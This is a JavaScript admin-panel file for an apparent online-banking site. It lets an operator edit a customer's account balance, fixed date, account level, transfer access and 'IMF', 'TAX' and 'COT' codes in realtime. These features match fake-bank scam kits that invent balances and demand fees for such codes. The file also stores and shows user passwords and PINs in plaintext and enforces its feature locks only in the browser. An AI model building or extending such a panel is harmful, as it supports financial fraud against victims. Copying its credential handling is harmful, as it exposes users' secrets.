

// --- 🛠️ THE UTILITY BOX ---
function formatCurrency(amount) {
    if (amount === null || amount === undefined || amount === '') return '0';
    let num = Number(String(amount).replace(/,/g, ''));
    return new Intl.NumberFormat('en-US').format(num);
}

async function safe(fn) {
    try {
        await fn();
    } catch (err) {
        hideSpinnerModal();
        console.error("Critical Error:", err);
        Swal.fire({
            title: "Error",
            text: err.message,
            icon: 'error',
            background: '#0C290F',
            color: '#fff'
        });
    }
}

const showSpinnerModal = () => {
    const el = document.getElementById('spinnerModal');
    if (el) el.style.display = 'flex';
};
const hideSpinnerModal = () => {
    const el = document.getElementById('spinnerModal');
    if (el) el.style.display = 'none';
};

/**
 * 🛰️ REALTIME ENGINE 1: Admin System Logic
 * Listens to 'admin_full_version' and global settings.
 */
window.initAdminLogicRealtime = async () => {
    const db = window.supabase;
    if (!db) return;

    // Initial State
    const { data } = await db.from('admin').select('*').eq('id', 1).single();
    if (data) applyAdminPermissions(data);

    // Realtime Stream
    db.channel('global-admin-stream')
        .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'admin' }, payload => {
            console.log("⚡ Admin System Change:", payload.new);
            applyAdminPermissions(payload.new);
        })
        .subscribe();
};

/**
 * 🛰️ REALTIME ENGINE 2: User Profile Logic
 */
window.initUserRealtime = async () => {
    const db = window.supabase;
    if (!USERID || !db) return;

    // Initial State
    const { data } = await db.from('users').select('*').eq('uuid', USERID).single();
    if (data) renderUserUI(data);

    // Realtime Stream
    db.channel(`user-sync-${USERID}`)
        .on('postgres_changes', {
            event: 'UPDATE',
            schema: 'public',
            table: 'users',
            filter: `uuid=eq.${USERID}`
        }, payload => {
            console.log("⚡ User Profile Change:", payload.new);
            renderUserUI(payload.new);
        })
        .subscribe();
};

/**
 * src/admin/profile/account/app.js
 * Enhanced Lock for iOS Date Pickers
 */
function applyAdminPermissions(adminData) {
    const isFull = adminData.admin_full_version === true;

    // Select the Fixed Date input specifically
    const fixedDateInput = document.querySelector('input[name="fixedDate"]');

    if (fixedDateInput) {
        if (!isFull) {
            // 1. Standard locks
            fixedDateInput.readOnly = true;
            fixedDateInput.setAttribute('disabled', 'true');

            // 2. iOS Specific Force-Lock (CSS + Attribute)
            fixedDateInput.style.pointerEvents = 'none'; // Prevents taps entirely
            fixedDateInput.style.opacity = '0.6';
            fixedDateInput.style.filter = 'grayscale(1)';

            // 3. Prevent Focus Fallback
            fixedDateInput.onfocus = (e) => e.target.blur();

            // 4. Change placeholder logic if needed
            fixedDateInput.value = "";
            fixedDateInput.placeholder = "Upgrade Required 🔒";
        } else {
            // Unlock
            fixedDateInput.readOnly = false;
            fixedDateInput.removeAttribute('disabled');
            fixedDateInput.style.pointerEvents = 'auto';
            fixedDateInput.style.opacity = '1';
            fixedDateInput.style.filter = 'none';
            fixedDateInput.onfocus = null;
        }
    }

    // Lock the submit buttons for Balances (fom4) if not full version
    const balanceBtn = document.querySelector('#fom4 button[type="submit"]');
    if (balanceBtn) {
        balanceBtn.disabled = !isFull;
    }
}

function renderUserUI(data) {
    userData = data;
    const setVal = (id, val) => {
        const el = document.getElementById(id);
        if (el) el.value = val ?? '';
    };

    // Text Content
    const nameEl = document.getElementById('weuss');
    if (nameEl) nameEl.innerText = `${data.firstname} ${data.lastname}`;

    const emailEl = document.getElementById('email');
    if (emailEl) emailEl.innerText = data.email;

    const imgEl = document.getElementById('pmler');
    if (imgEl) imgEl.src = data.profileImage || "../assets/images/user/avatar-1.jpg";

    // Form Inputs (Profile)
    setVal('firstName', data.firstname);
    setVal('middlename', data.middlename);
    setVal('lastName', data.lastname);
    setVal('accountnumber', data.accountNumber);
    setVal('currency', data.currency);
    setVal('date', data.dateOfBirth);
    setVal('city', data.city);
    setVal('pin', data.pin);
    setVal('password', data.password);
    setVal('change_email', data.email);
    setVal('active', String(data.activeuser));
    setVal('screen_lock', String(data.lockscreen));
    setVal('accountLevel', data.accountLevel);
    setVal('transferAccess', data.transferAccess);
    setVal('accounttype', data.accttype);
    setVal('country', data.country);

    // Form Inputs (Balance & Codes)
    setVal('accountBalance', formatCurrency(data.accountBalance));
    setVal('accountTypeBalance', formatCurrency(data.accountTypeBalance));
    setVal('fixedDate', data.fixedDate);
    setVal('imf', data.IMF);
    setVal('tax', data.TAX);
    setVal('cot', data.COT);
}

/**
 * 💾 INITIALIZE LISTENERS
 */
window.initFormListeners = () => {
    const db = window.supabase;

    // 1. Codes Update (IMF, TAX, COT)
    const codeForm = document.getElementById('codeForm');
    if (codeForm) {
        codeForm.addEventListener('submit', (ev) => safe(async () => {
            ev.preventDefault();
            const fd = new FormData(codeForm);
            showSpinnerModal();

            const { error } = await db.from('users').update({
                IMF: fd.get('imf') || '',
                COT: fd.get('cot') || '',
                TAX: fd.get('tax') || ''
            }).eq('uuid', USERID);

            hideSpinnerModal();
            if (error) throw error;

            codeForm.reset();
            Swal.fire({
                title: "Codes Synced",
                text: "Security codes updated in realtime.",
                icon: 'success',
                background: '#0C290F',
                confirmButtonColor: '#10b981'
            });
        }));
    }

    // 2. Adjust Account Level (Adjust200)
    const Adjust200 = document.getElementById('Adjust200');
    if (Adjust200) {
        Adjust200.addEventListener('click', () => safe(async () => {
            const { data: adminData } = await db.from('admin').select('admin_full_version').eq('id', 1).single();

            if (adminData && adminData.admin_full_version === true) {
                const newValue = document.getElementById('adjustAccountLevel')?.value || '';
                if (!newValue) return Swal.fire({ title: "Empty field", icon: 'warning', background: '#0C290F' });

                showSpinnerModal();
                const { error } = await db.from('users').update({ adjustAccountLevel: newValue }).eq('uuid', USERID);
                hideSpinnerModal();

                if (error) throw error;
                Swal.fire({
                    title: "Adjusted!",
                    text: `Account level adjusted to ${newValue}`,
                    icon: 'success',
                    background: '#0C290F',
                    confirmButtonColor: '#10b981'
                });
            } else {
                Swal.fire({ title: "Upgrade Required", text: "You need the Full Version.", icon: 'error', background: '#0C290F' });
            }
        }));
    }

    // 3. Personal Info (Profile Form)
    const profileForm = document.getElementById('profileForm');
    if (profileForm) {
        profileForm.addEventListener('submit', (ev) => safe(async () => {
            ev.preventDefault();
            showSpinnerModal();
            const fd = new FormData(ev.target);

            const updates = {
                firstname: fd.get('firstName'),
                middlename: fd.get('middlename'),
                lastname: fd.get('lastName'),
                email: fd.get('change_email'),
                password: fd.get('password'),
                country: fd.get('country'),
                city: fd.get('city'),
                lockscreen: fd.get('screen_lock') === 'true',
                activeuser: fd.get('active') === 'true',
                accountNumber: fd.get('accountnumber'),
                currency: fd.get('currency'),
                dateOfBirth: fd.get('date'),
                pin: fd.get('pin'),
                accountLevel: fd.get('accountLevel'),
                transferAccess: fd.get('transferAccess'),
                accttype: fd.get('accounttype')
            };

            const { error } = await db.from('users').update(updates).eq('uuid', USERID);
            hideSpinnerModal();
            if (error) throw error;

            ev.target.reset();
            Swal.fire({ icon: 'success', title: 'Profile Updated', background: '#0C290F' });
        }));
    }

    // 4. Balances (fom4)
    const fom4 = document.getElementById('fom4');
    if (fom4) {
        fom4.addEventListener('submit', (ev) => safe(async () => {
            ev.preventDefault();
            showSpinnerModal();
            const fd = new FormData(ev.target);

            const updates = {
                accountBalance: fd.get('accountBalance').replace(/,/g, ''),
                accountTypeBalance: fd.get('accountTypeBalance').replace(/,/g, ''),
                fixedDate: fd.get('fixedDate')
            };

            const { error } = await db.from('users').update(updates).eq('uuid', USERID);
            hideSpinnerModal();

            if (error) throw error;

            ev.target.reset();
            Swal.fire({
                icon: 'success',
                title: 'Balances & Date Updated',
                background: '#0C290F',
                color: '#fff'
            });
        }));
    }
};